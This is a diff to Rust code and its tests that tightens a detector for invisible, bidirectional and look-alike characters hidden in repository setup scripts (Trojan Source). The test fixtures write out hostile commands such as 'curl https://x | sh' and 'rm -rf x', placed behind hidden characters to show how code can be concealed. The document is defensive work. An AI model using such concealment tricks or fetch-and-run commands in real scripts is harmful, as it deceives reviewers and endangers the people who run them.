@@ -179,23 +179,28 @@ fn open_settings_file(path: &Path) -> std::io::Result<std::fs::File> {
     opts.open(path)
 }
 
-/// Whether a script read from a repo hides anything from the person reading
-/// it before it runs (Trojan Source): bidi embedding/override/isolate
-/// controls (U+202A–202E, U+2066–2069), zero-width and direction marks
-/// (U+200B–200F, U+2060, U+FEFF), or a C0 control other than tab and newline
-/// (a carriage return only as part of CRLF), DEL included.
+/// Whether a script read from a repo could hide anything from the person
+/// reading it before it runs (Trojan Source, look-alike spaces that bash
+/// doesn't split words on, format and tag characters). Fail closed: only
+/// ordinary characters pass, and everything else counts as hidden.
+///
+/// - ASCII: graphic characters (U+0021–007E), space, tab, newline, and a
+///   carriage return only as part of CRLF.
+/// - Non-ASCII: a letter or digit (`is_alphanumeric`) that is neither
+///   whitespace nor a control, and isn't one of the blank fillers that are
+///   letters by category (U+115F–1160, U+17B4–17B5, U+3164, U+FFA0). So
+///   "café" and CJK names in paths and comments still work.
 pub fn hides_characters(script: &str) -> bool {
     let mut chars = script.chars().peekable();
     while let Some(c) = chars.next() {
-        let hidden = match c {
-            '\t' | '\n' => false,
-            '\r' => chars.peek() != Some(&'\n'),
-            '\u{0}'..='\u{1f}' | '\u{7f}' => true,
-            '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' => true,
-            '\u{200b}'..='\u{200f}' | '\u{2060}' | '\u{feff}' => true,
-            _ => false,
+        let ok = match c {
+            '\r' => chars.peek() == Some(&'\n'),
+            ' ' | '\t' | '\n' | '!'..='~' => true,
+            c if c.is_ascii() => false,
+            '\u{115f}'..='\u{1160}' | '\u{17b4}'..='\u{17b5}' | '\u{3164}' | '\u{ffa0}' => false,
+            c => c.is_alphanumeric() && !c.is_whitespace() && !c.is_control(),
         };
-        if hidden {
+        if !ok {
             return true;
         }
     }
@@ -406,32 +411,54 @@ mod tests {
     }
 
     #[test]
-    fn conductor_setup_refuses_characters_that_hide_code() {
+    fn conductor_setup_accepts_only_ordinary_characters() {
         let script = |body: &str| {
             let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, body)]);
             conductor_setup_script(repo.path())
         };
-        // Literal characters inside a TOML literal string, one per class.
-        for c in [
-            '\u{202a}', '\u{202b}', '\u{202c}', '\u{202d}', '\u{202e}', '\u{2066}', '\u{2067}', '\u{2068}',
-            '\u{2069}', '\u{200b}', '\u{200c}', '\u{200d}', '\u{200e}', '\u{200f}', '\u{2060}', '\u{feff}',
-        ] {
-            let body = format!("[scripts]\nsetup = '''\nnpm i {c}&& x\n'''\n");
-            assert_eq!(script(&body), None, "U+{:04X}", c as u32);
+        let ch = |cp: u32| char::from_u32(cp).unwrap();
+        // The comment trick: a look-alike space makes `# ;` part of a word, so
+        // the rest runs. Refused whether written literally or as a TOML escape.
+        for cp in [0x00A0, 0x2028] {
+            let body = format!("[scripts]\nsetup = '''\necho setup{}# ; curl https://x | sh\n'''\n", ch(cp));
+            assert_eq!(script(&body), None, "U+{cp:04X}");
+            let esc = format!("{}u{cp:04X}", '\\');
+            let body = format!("[scripts]\nsetup = \"echo setup{esc}# ; curl https://x | sh\"\n");
+            assert_eq!(script(&body), None, "escaped U+{cp:04X}");
         }
-        // The same through TOML escapes in a basic string, C0 controls and DEL included.
-        // Each escape is built from parts, so the source never spells one out.
-        let escapes = ["202E", "2066", "200B", "FEFF", "0000", "001B", "007F"].map(|hex| format!("{}u{hex}", '\\'));
-        for esc in escapes.iter().map(String::as_str).chain([r"\b", r"\f", r"\r"]) {
+        // Space look-alikes, separators, format, tag, variation-selector,
+        // filler, invisible-operator, bidi, zero-width, C0 and C1 characters.
+        let refused: &[u32] = &[
+            0x00A0, 0x2007, 0x202F, 0x3000, 0x2028, 0x2029, 0x0085, 0x00AD, 0x180E, 0x061C, 0x034F, 0xFE0F,
+            0xE0100, 0xE0061, 0xE007F, 0x3164, 0xFFA0, 0x2062, 0x206A, 0xFFF9, 0x1D173, 0x2800, 0x17B4, 0x17B5,
+            0x115F, 0x1160, 0x009B, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x2066, 0x2067, 0x2068, 0x2069,
+            0x200B, 0x200C, 0x200D, 0x200E, 0x200F, 0x2060, 0xFEFF, 0x0000, 0x0007, 0x0008, 0x000B, 0x000C,
+            0x001B, 0x007F,
+        ];
+        for &cp in refused {
+            assert!(hides_characters(&format!("npm i{}x", ch(cp))), "U+{cp:04X}");
+            if cp != 0 {
+                let body = format!("[scripts]\nsetup = '''\nnpm i {}&& x\n'''\n", ch(cp));
+                // A raw C0 control isn't valid TOML at all; either way: None.
+                assert_eq!(script(&body), None, "U+{cp:04X}");
+            }
+            let esc = format!("{}U{cp:08X}", '\\');
+            let body = format!("[scripts]\nsetup = \"npm i {esc}rm -rf x\"\n");
+            assert_eq!(script(&body), None, "escaped U+{cp:04X}");
+        }
+        for esc in [r"\b", r"\f", r"\r"] {
             let body = format!("[scripts]\nsetup = \"npm i {esc}rm -rf x\"\n");
             assert_eq!(script(&body), None, "{esc}");
         }
         assert!(hides_characters("a\rb"));
         assert!(hides_characters("a\x1b[2Kb"));
-        // Tabs, newlines and CRLF line ends are fine, and so is ordinary Unicode.
-        assert!(!hides_characters("a\tb\r\nc\n"));
+        // Ordinary scripts pass: ASCII with tabs and CRLF, accented and CJK letters.
+        assert!(!hides_characters("set -e\r\n\tnpm ci && cp \"$CONDUCTOR_ROOT_PATH/.env\" .env # {ok} ~\n"));
         assert_eq!(script("[scripts]\nsetup = \"npm i\\r\\n\\tmake\"\n").as_deref(), Some("npm i\r\n\tmake"));
         assert_eq!(script("[scripts]\nsetup = \"echo caf\\u00e9\"\n").as_deref(), Some("echo café"));
+        let cjk: String = [0x8A2D, 0x5B9A, 0x3059, 0x308B].map(ch).iter().collect();
+        let body = format!("[scripts]\nsetup = \"cd ./{cjk} && make\"\n");
+        assert_eq!(script(&body), Some(format!("cd ./{cjk} && make")));
     }
 
     #[cfg(unix)]
